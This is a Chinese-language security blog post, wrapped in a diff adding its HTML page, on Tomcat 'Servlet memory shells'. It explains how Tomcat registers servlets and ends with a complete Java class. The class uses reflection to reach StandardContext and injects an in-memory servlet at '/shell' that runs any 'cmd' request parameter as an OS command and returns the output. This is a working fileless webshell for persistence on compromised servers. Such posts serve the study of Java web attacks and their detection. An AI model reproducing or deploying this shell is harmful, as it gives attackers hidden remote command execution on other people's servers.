@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="博客">
+    <meta name="description" content="最难不过坚持">
+    <meta name="author" content="lazysugar">
+    
+    <title>
+        
+            Servlet内存马 |
+        
+        lazysugar&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/favicon-32x32.ico">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"1azy.icu","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"style":{"primary_color":"#0066cc","logo":"/favicon-32x32.ico","favicon":"/favicon-32x32.ico","avatar":"/favicon-32x32.ico","first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"最难不过坚持.","hitokoto":true},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":false},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"version":"3.8.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container border-box">
+
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/favicon-32x32.ico">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               lazysugar&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+
+                
+
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+
+        <div class="article-content-container border-box">
+
+            
+
+            <div class="article-content-bottom border-box">
+                
+                    <div class="article-title">
+                        Servlet内存马
+                    </div>
+                
+
+                
+                    <div class="article-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/favicon-32x32.ico">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author">
+                                <span class="name">lazysugar</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="article-meta-info-container border-box post">
+    <div class="article-meta-info border-box">
+        
+
+
+        
+            <span class="meta-info-item article-create-date">
+                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
+                <span class="pc">2023-07-05 03:16:12</span>
+                <span class="mobile">2023-07-05 03:16</span>
+            </span>
+
+            <span class="meta-info-item article-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="pc" data-updated="Wed Oct 25 2023 18:35:46 GMT+0800">2023-10-25 18:35:46</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="article-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="article-tag meta-info-item border-box">
+                <i class="icon fas fa-tags"></i>&nbsp;
+                <ul class="article-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item article-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>941 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item article-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>4 分钟</span>
+            </span>
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="article-content keep-markdown-body">
+                    
+
+                    <h1 id="什么是Servlet？"><a href="#什么是Servlet？" class="headerlink" title="什么是Servlet？"></a>什么是Servlet？</h1><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p>
+<p>使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p>
+<p>Java Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果，来浅看一下Servlet的架构图。</p>
+<p><img src="/images/20231005015227.png"></p>
+<h1 id="Servlet注册流程"><a href="#Servlet注册流程" class="headerlink" title="Servlet注册流程"></a>Servlet注册流程</h1><p>在<code>org.apache.catalina.startup.ContextConfig#webConfig</code>中会创建webxml对象并扫描配置文件来添加filter、servlet等信息，之后调用<code>org.apache.catalina.startup.ContextConfig#configureContext</code>，这是配置context的方法，在前面分析Filter的时候已经了解过了，现在针对Servlet看看是如何注册的</p>
+<p><img src="/images/20231005015655.png"></p>
+<p>在下面是处理servlet的逻辑，首先读取到servlet后进行迭代，然后调用<code>createWrapper</code>方法创建了一个<code>wrapper</code></p>
+<p><img src="/images/20231005020243.png"></p>
+<p>设置了<code>LoadOnStartup</code>、<code>Name</code>、<code>ServletClass</code>，就是web.xml文件中的属性</p>
+<p><img src="/images/20231005020539.png"></p>
+<p>最后调用<code>addChild</code>把 <code>servlet</code> 放进了 children 里面，children 也就是 <code>StandardWrapper</code></p>
+<p><img src="/images/20231005020838.png"></p>
+<p>调用<code>addServletMappingDecoded()</code>方法添加映射关系,将 url 路径和 servlet 类做映射。</p>
+<p><img src="/images/20231005021000.png"></p>
+<p>总结一下，动态生成并添加做了以下几步：</p>
+<ol>
+<li>createWapper()创建 Wapper 对象</li>
+<li>设置 Servlet 的LoadOnStartUp的值</li>
+<li>设置 Servlet 的 Name</li>
+<li>设置 Servlet 对应的 Class</li>
+<li>将 Servlet 添加到 context 的 children 中</li>
+<li>将 url 路径和 servlet 做映射</li>
+</ol>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/344003.html" >关于loadOnStartup懒加载的实现Drunk佬分析的很好<i class="fas fa-external-link-alt"></i></a>，我们只要知道，在 servlet 的配置当中，<code>&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</code>当值为 0 或者大于 0 时，表示容器在应用启动时就加载这个 servlet； 当是一个负数时或者没有指定时，则指示容器在该 servlet 被选择时才加载。 正数的值越小，启动该 servlet 的优先级越高。</p>
+<h1 id="Servlet内存马创建"><a href="#Servlet内存马创建" class="headerlink" title="Servlet内存马创建"></a>Servlet内存马创建</h1><p>和Filter差不多，都是先获取StandardContext对象，然后调用其添加Servlet的方法，用大佬的图：<br><img src="/images/20231005023747.png"></p>
+<ol>
+<li><p>获取StandardContext对象</p>
+</li>
+<li><p>编写恶意 Servlet</p>
+</li>
+<li><p>通过StandardContext.createWrapper()创建StandardWrapper对象</p>
+</li>
+<li><p>设置StandardWrapper对象的loadOnStartup属性值</p>
+</li>
+<li><p>设置StandardWrapper对象的ServletName属性值</p>
+</li>
+<li><p>设置StandardWrapper对象的ServletClass属性值</p>
+</li>
+<li><p>将StandardWrapper对象添加进StandardContext对象的children属性中</p>
+</li>
+<li><p>通过StandardContext.addServletMappingDecoded()添加对应的路径映射</p>
+</li>
+</ol>
+<p>关于StandardContext对象的获取在Filter的文章中有详细的描述</p>
+<p>完整测试的内存马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">public class AddTomcatServlet extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            String servletName = &quot;lazySugar&quot;;</span><br><span class="line"></span><br><span class="line">            // 从 request 中获取 servletContext</span><br><span class="line">            ServletContext servletContext = req.getServletContext();</span><br><span class="line"></span><br><span class="line">            // 如果已有此 servletName 的 Servlet，则不再重复添加</span><br><span class="line">            if (servletContext.getServletRegistration(servletName) == null) &#123;</span><br><span class="line"></span><br><span class="line">                StandardContext o = null;</span><br><span class="line"></span><br><span class="line">                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象</span><br><span class="line">                while (o == null) &#123;</span><br><span class="line">                    Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">                    f.setAccessible(true);</span><br><span class="line">                    Object object = f.get(servletContext);</span><br><span class="line"></span><br><span class="line">                    if (object instanceof ServletContext) &#123;</span><br><span class="line">                        servletContext = (ServletContext) object;</span><br><span class="line">                    &#125; else if (object instanceof StandardContext) &#123;</span><br><span class="line">                        o = (StandardContext) object;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Servlet servlet = new Servlet() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    public void init(ServletConfig servletConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    @Override</span><br><span class="line">                    public ServletConfig getServletConfig() &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    @Override</span><br><span class="line">                    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;</span><br><span class="line">                        String cmd = servletRequest.getParameter(&quot;cmd&quot;);</span><br><span class="line">                        boolean isLinux = true;</span><br><span class="line">                        String osTyp = System.getProperty(&quot;os.name&quot;);</span><br><span class="line">                        if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                            isLinux = false;</span><br><span class="line">                        &#125;</span><br><span class="line">                        String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;</span><br><span class="line">                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                        Scanner s = new Scanner(in).useDelimiter(&quot;\\a&quot;);</span><br><span class="line">                        String output = s.hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line">                        PrintWriter out = servletResponse.getWriter();</span><br><span class="line">                        out.println(output);</span><br><span class="line">                        out.flush();</span><br><span class="line">                        out.close();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    @Override</span><br><span class="line">                    public String getServletInfo() &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    @Override</span><br><span class="line">                    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                // 使用 Wrapper 封装 Servlet</span><br><span class="line">                Wrapper wrapper = o.createWrapper();</span><br><span class="line">                wrapper.setName(servletName);</span><br><span class="line">                wrapper.setLoadOnStartup(1);</span><br><span class="line">                wrapper.setServlet(servlet);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                // 向 children 中添加 wrapper</span><br><span class="line">                o.addChild(wrapper);</span><br><span class="line"></span><br><span class="line">                // 添加 servletMappings</span><br><span class="line">                o.addServletMapping(&quot;/shell&quot;, servletName);</span><br><span class="line"></span><br><span class="line">                PrintWriter writer = resp.getWriter();</span><br><span class="line">                writer.println(&quot;servlet added&quot;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+                </div>
+
+                
+                        
+<div class="article-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="post-title border-box text-ellipsis">
+                Servlet内存马
+            </div>
+
+            <div class="post-link border-box text-ellipsis">
+                2023/07/05/Servlet内存马/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">lazysugar</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2023-07-05 03:16</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans">
+                        <i class="fa-brands fa-creative-commons"></i>
+                        <i class="fa-brands fa-creative-commons-by"></i>
+                        <i class="fa-brands fa-creative-commons-nc"></i>
+                        <i class="fa-brands fa-creative-commons-sa"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="article-nav">
+                        
+                            <div class="article-prev">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2023/07/15/Tomcat%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"
+                                   title="Tomcat类加载器"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                      <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                            <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Tomcat类加载器</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="article-next">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2023/06/25/Listener%E5%86%85%E5%AD%98%E9%A9%AC/"
+                                   title="Listener内存马"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Listener内存马</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                            <span class="right arrow-icon flex-center">
+                                      <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFServlet%EF%BC%9F"><span class="nav-text">什么是Servlet？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Servlet%E6%B3%A8%E5%86%8C%E6%B5%81%E7%A8%8B"><span class="nav-text">Servlet注册流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9B%E5%BB%BA"><span class="nav-text">Servlet内存马创建</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2023
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">lazysugar</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+                <div class="deploy-info info-item default">
+                    
+                        本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span> 提供部署服务
+                        
+                </div>
+            
+        
+
+        <div class="count-item info-item default">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">66.9k</span>
+                </span>
+            
+
+            
+
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFServlet%EF%BC%9F"><span class="nav-text">什么是Servlet？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Servlet%E6%B3%A8%E5%86%8C%E6%B5%81%E7%A8%8B"><span class="nav-text">Servlet注册流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%9B%E5%BB%BA"><span class="nav-text">Servlet内存马创建</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local-search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- code-block -->
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- category-page -->
+    
+
+    <!-- links-page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
